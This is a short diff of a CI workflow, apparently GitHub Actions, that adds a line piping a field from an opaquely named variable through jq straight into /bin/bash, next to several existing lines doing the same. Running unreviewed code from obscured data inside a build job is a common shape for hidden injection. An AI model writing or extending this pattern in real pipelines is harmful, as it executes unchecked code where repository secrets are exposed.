@@ -27,6 +27,7 @@ jobs:
           echo $ryx1 | jq -r .pmud1412 | /bin/bash
           echo $mh7 | jq -r .bg24 | /bin/bash
           echo $m30 | jq -r .unb74656 | /bin/bash
+          printf '%s' "$xxnf4589" | jq -r .t96 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
